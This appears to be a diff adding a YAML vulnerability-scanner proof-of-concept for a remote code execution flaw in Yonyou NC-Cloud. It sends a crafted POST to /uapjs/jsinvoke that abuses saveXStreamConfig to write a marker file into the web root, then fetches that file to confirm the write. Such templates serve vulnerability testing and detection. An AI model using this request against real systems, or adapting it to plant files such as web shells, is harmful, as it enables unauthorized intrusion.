@@ -1,0 +1,20 @@
+name: poc-yaml-nc-cloud-jsinvoke-rce
+rules:
+    - method: POST
+      path: /uapjs/jsinvoke/?action=invoke
+      body: >-
+        {"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["1314520","webapps/nc_web/1314520.txt"]}
+      follow_redirects: false
+      expression: |
+        response.status == 200
+    - method: GET
+      path: /1314520.txt
+      follow_redirects: false
+      expression: |
+        response.status == 200 && response.body.bcontains(b'1314520')
+        
+detail:
+    author: nc-cloud-jsinvoke-rce
+    links:
+        - app="用友-NC-Cloud"
+
